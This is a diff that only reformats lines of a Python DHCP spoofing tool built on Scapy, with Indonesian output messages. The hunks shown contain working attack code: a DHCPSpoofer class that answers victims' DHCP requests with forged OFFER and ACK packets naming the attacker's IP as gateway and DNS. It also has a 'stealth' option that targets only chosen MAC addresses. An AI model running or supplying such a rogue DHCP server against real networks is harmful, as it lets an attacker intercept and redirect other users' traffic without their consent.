@@ -24,8 +24,16 @@ from threading import Event
 
 try:
     from scapy.all import (
-        Ether, IP, UDP, BOOTP, DHCP, get_if_addr, get_if_hwaddr,
-        conf, sniff, sendp
+        Ether,
+        IP,
+        UDP,
+        BOOTP,
+        DHCP,
+        get_if_addr,
+        get_if_hwaddr,
+        conf,
+        sniff,
+        sendp,
     )
 except ImportError:
     sys.exit("[!] Scapy tidak terinstall. Install dengan: pip install scapy")
@@ -68,8 +76,15 @@ def parse_ip_range(range_str: str) -> list[str]:
 
 
 class DHCPSpoofer:
-    def __init__(self, iface: str, gateway: str, dns: str, ip_pool: list[str],
-                 lease_time: int, stealth_macs: list[str] | None):
+    def __init__(
+        self,
+        iface: str,
+        gateway: str,
+        dns: str,
+        ip_pool: list[str],
+        lease_time: int,
+        stealth_macs: list[str] | None,
+    ):
         self.iface = iface
         self.gateway = gateway
         self.dns = dns
@@ -110,7 +125,9 @@ class DHCPSpoofer:
         if self.stealth_macs and client_mac.lower() not in [m.lower() for m in self.stealth_macs]:
             return
 
-        client_id = dhcp_opts.get("client_id", client_mac.encode() if isinstance(client_mac, str) else b"")
+        client_id = dhcp_opts.get(
+            "client_id", client_mac.encode() if isinstance(client_mac, str) else b""
+        )
         if isinstance(client_id, bytes):
             client_id = client_id.decode("utf-8", errors="replace")
 
@@ -150,7 +167,9 @@ class DHCPSpoofer:
         self.assigned[client_mac] = assigned_ip
         dhcp_ack = self._build_ack(pkt, assigned_ip, client_mac)
         sendp(dhcp_ack, iface=self.iface, verbose=False)
-        print(f"  [+] DHCP ACK dikirim ke {client_mac} -> IP: {assigned_ip} | GW: {self.gateway} | DNS: {self.dns}")
+        print(
+            f"  [+] DHCP ACK dikirim ke {client_mac} -> IP: {assigned_ip} | GW: {self.gateway} | DNS: {self.dns}"
+        )
 
     def _build_offer(self, discover_pkt, offered_ip: str, client_mac: str):
         dhcp_opts = [
@@ -171,7 +190,9 @@ class DHCPSpoofer:
         ip = IP(src=self.attacker_ip, dst="255.255.255.255")
         udp = UDP(sport=67, dport=68)
         bootp = BOOTP(
-            op=2, yiaddr=offered_ip, siaddr=self.attacker_ip,
+            op=2,
+            yiaddr=offered_ip,
+            siaddr=self.attacker_ip,
             chaddr=bytes.fromhex(client_mac.replace(":", "")),
             xid=discover_pkt[BOOTP].xid,
         )
@@ -196,7 +217,9 @@ class DHCPSpoofer:
         ip = IP(src=self.attacker_ip, dst="255.255.255.255")
         udp = UDP(sport=67, dport=68)
         bootp = BOOTP(
-            op=2, yiaddr=assigned_ip, siaddr=self.attacker_ip,
+            op=2,
+            yiaddr=assigned_ip,
+            siaddr=self.attacker_ip,
             chaddr=bytes.fromhex(client_mac.replace(":", "")),
             xid=request_pkt[BOOTP].xid,
         )
@@ -218,10 +241,22 @@ Contoh:
     parser.add_argument("--iface", required=True, help="Interface jaringan (contoh: eth0, wlan0)")
     parser.add_argument("--gateway", help="IP gateway yang akan diberikan (default: self IP)")
     parser.add_argument("--dns", help="IP DNS yang akan diberikan (default: self IP)")
-    parser.add_argument("--range", required=True, help="Pool IP (contoh: 192.168.1.100-192.168.1.200 atau 10.0.0.0/24)")
-    parser.add_argument("--lease-time", type=int, default=86400, help="Waktu lease dalam detik (default: 86400)")
-    parser.add_argument("--stealth", nargs="*", help="MAC address client untuk stealth mode (hanya respond ke MAC ini)")
-    parser.add_argument("--timeout", type=int, default=0, help="Timeout dalam detik (0 = terus berjalan)")
+    parser.add_argument(
+        "--range",
+        required=True,
+        help="Pool IP (contoh: 192.168.1.100-192.168.1.200 atau 10.0.0.0/24)",
+    )
+    parser.add_argument(
+        "--lease-time", type=int, default=86400, help="Waktu lease dalam detik (default: 86400)"
+    )
+    parser.add_argument(
+        "--stealth",
+        nargs="*",
+        help="MAC address client untuk stealth mode (hanya respond ke MAC ini)",
+    )
+    parser.add_argument(
+        "--timeout", type=int, default=0, help="Timeout dalam detik (0 = terus berjalan)"
+    )
     args = parser.parse_args()
 
     print("=" * 55)
